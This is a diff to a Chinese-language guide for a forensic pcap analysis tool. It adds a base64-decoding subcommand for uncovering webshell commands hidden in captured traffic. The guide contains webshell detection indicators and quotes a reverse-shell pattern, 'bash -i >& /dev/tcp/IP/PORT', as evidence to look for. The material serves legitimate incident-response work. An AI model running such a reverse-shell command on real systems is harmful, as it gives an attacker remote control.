@@ -52,11 +52,13 @@ python scripts/pcapkit.py summary 流量.pcap
 | 木马本体 | `<?php`、`eval(`、`GIF89a` | `export` 的 `_upload_*.bin` | 跟随流看请求体 |
 | WebShell 控制 | antSword / 冰蝎 / 哥斯拉 UA 与固定参数 | `grep "antsword" "pass="` | `-Y 'http.user_agent contains "antSword"'` |
 | 命令执行外联 | 非 HTTP 长连接、反弹端口 | `summary` 末尾 + `stream <ID>` | `-Y 'ip.addr==<外网IP>'` |
+| 编码载荷 | 参数里的 base64 命令 | `b64`（蚁剑/冰蝎/哥斯拉必查） | 无等价过滤器，需手工解 |
 
 ## 第 3 步：证据落地（最容易做错）
 
 ```bash
 python scripts/pcapkit.py export 流量.pcap -d objects/     # 响应体 + 上传片段
+python scripts/pcapkit.py b64    流量.pcap                 # 解 base64 参数，找反弹/C2 地址
 python scripts/pcapkit.py stream 流量.pcap 13706           # 单条流（默认已解 gzip，可读）
 python scripts/pcapkit.py stream 流量.pcap 13706 --raw     # 线上原始字节，可重定向为 .bin
 python scripts/pcapkit.py http   流量.pcap --csv req.csv   # 请求全量清单
@@ -98,8 +100,12 @@ python scripts/pcapkit.py report 流量.pcap -d report/     # 生成 report.md
 11. **Windows 上的终端防护会吃掉证据**。导出的木马可能被当场隔离，连分析脚本
     本身都可能被删（含完整一句话的文件会被判威胁）。导出目录要加排除项，
     或改在 Linux/WSL 里做；需要保真时用 `stream <ID> --raw` 存原始字节。
-12. **改重组/解析逻辑后先跑 `python tests/test_pcapkit.py`**（37 个用例，自造样本，
+12. **改重组/解析逻辑后先跑 `python tests/test_pcapkit.py`**（42 个用例，自造样本，
     覆盖乱序、重传、keep-alive、gzip/chunked、编码注入），别拿真实样本赌。
+13. **蚁剑/冰蝎/哥斯拉的命令在 base64 里，`grep` 永远搜不到**。HTTP 明文只有
+    `fff=<一串 base64>`，反弹地址就藏在解出来的 `bash -i >& /dev/tcp/IP/PORT` 里。
+    必须跑 `b64` 子命令；`summary` 末尾也会自动汇总解码出的地址。
+    解码时注意 `+` 被 URL 编码成 `%2B`，先还原再解，否则 token 会从 `%` 处断裂。
 
 ## 常用扩展场景
 
@@ -110,6 +116,6 @@ python scripts/pcapkit.py report 流量.pcap -d report/     # 生成 report.md
 
 ## 资源
 
-- `scripts/pcapkit.py` — 零依赖工具，六个子命令：`summary / http / grep / stream / export / report`。
+- `scripts/pcapkit.py` — 零依赖工具，七个子命令：`summary / http / grep / stream / b64 / export / report`。
 - `references/wireshark-filters.md` — Wireshark GUI 与 tshark 过滤器速查（按攻击链分好组）。
 - `references/report-template.md` — 取证报告模板与结论写法示例。
